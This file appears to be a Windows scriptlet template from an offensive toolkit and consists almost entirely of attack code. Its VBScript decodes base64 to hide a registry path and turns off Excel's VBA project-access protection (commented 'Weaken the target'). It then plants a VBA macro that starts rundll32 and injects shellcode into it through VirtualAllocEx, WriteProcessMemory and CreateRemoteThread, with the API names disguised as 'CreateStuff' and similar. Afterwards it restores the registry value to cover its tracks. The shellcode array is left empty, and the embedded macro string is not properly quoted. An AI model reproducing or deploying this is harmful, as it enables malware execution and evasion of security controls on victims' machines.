<?XML version="1.0"?>
<scriptlet>
	<registration progid="exampleprogid" classid="{exampleclassid}" >
	<script language="vbscript">
		<![CDATA[

		Function Base64Decode(ByVal roar)

			Const things = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
			Dim dataLength
			Dim sOut
			Dim groupBegin

			roar = Replace(roar, vbCrLf, "")
			roar = Replace(roar, vbTab, "")
			roar = Replace(roar, " ", "")

			dataLength = Len(roar)
			If dataLength Mod 4 <> 0 Then
				Exit Function
			End If
	  
			For groupBegin = 1 To dataLength Step 4
				Dim numDataBytes
				Dim CharCounter
				Dim thisChar
				Dim thisData
				Dim nGroup
				Dim pOut
				numDataBytes = 3
				nGroup = 0

			For CharCounter = 0 To 3
				thisChar = Mid(roar, groupBegin + CharCounter, 1)

				If thisChar = "=" Then
					numDataBytes = numDataBytes - 1
					thisData = 0
				Else
					thisData = InStr(1, things, thisChar, vbBinaryCompare) - 1
				End If

				nGroup = 64 * nGroup + thisData
			Next
	    
				nGroup = Hex(nGroup)
				nGroup = String(6 - Len(nGroup), "0") & nGroup

				pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
				Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
				Chr(CByte("&H" & Mid(nGroup, 5, 2)))

				sOut = sOut & Left(pOut, numDataBytes)
	  		Next

				Base64Decode = sOut
		End Function

	Set objExcel = CreateObject("Excel.Application")
	objExcel.Visible = False

	Set WshShell = CreateObject("Wscript.Shell")

	function RegExists(regKey)
		on error resume next
		WshShell.RegRead regKey
		RegExists = (Err.number = 0)
	end function

	' Get the old AccessVBOM value
	RegPath = Base64Decode("SEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVw=") & objExcel.Version & Base64Decode("XEV4Y2VsXFNlY3VyaXR5XEFjY2Vzc1ZCT00=")

	if RegExists(RegPath) then
		action = WshShell.RegRead(RegPath)
	else
		action = ""
	end if

	' Weaken the target
	WshShell.RegWrite RegPath, 1, "REG_DWORD"

	' Run the macro
	Set objWorkbook = objExcel.Workbooks.Add()
	Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
	xlmodule.CodeModule.AddFromString 

	Private Type PROCESS_INFORMATION
		hProcess As Long    
		hThread As Long    
		dwProcessId As Long   
		dwThreadId As Long
	End Type
		
	Private Type STARTUPINFO
		cb As Long    
		lpReserved As String    
		lpDesktop As String    
		lpTitle As String    
		dwX As Long    
		dwY As Long    
		dwXSize As Long    
		dwYSize As Long    
		dwXCountChars As Long    
		dwYCountChars As Long    
		dwFillAttribute As Long    
		dwFlags As Long    
		wShowWindow As Integer    
		cbReserved2 As Integer    
		lpReserved2 As Long    
		hStdInput As Long    
		hStdOutput As Long    
		hStdError As Long
	End Type

	#If VBA7 Then
		Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr    
		Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr    
		Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr    
		Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
	#Else
		Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
		Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long    
		Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
		Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
	#End If
	Sub Auto_Open()    
		Dim myByte As Long, myArray As Variant, offset As Long    
		Dim pInfo As PROCESS_INFORMATION    
		Dim sInfo As STARTUPINFO    
		Dim sNull As String    
		Dim sProc As String

	#If VBA7 Then    
		Dim rwxpage As LongPtr, res As LongPtr
	#Else    
		Dim rwxpage As Long, res As Long
	#End If

	myArray = Array()
	
	If Len(Environ("ProgramW6432")) > 0 Then
		sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
	Else
		sProc = Environ("windir") & "\\System32\\rundll32.exe"
	End If

	res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)    
	rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)

	For offset = LBound(myArray) To UBound(myArray)
		myByte = myArray(offset)
		res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
	Next offset

	res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)

End Sub
Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub

objExcel.DisplayAlerts = False
on error resume next
objExcel.Run "Auto_Open"
objWorkbook.Close False
objExcel.Quit

' Restore the registry to its old state	
if action = "" then
	WshShell.RegDelete RegPath
else
	WshShell.RegWrite RegPath, action, "REG_DWORD"
end if
		]]>
		</script>
	</registration>
</scriptlet>
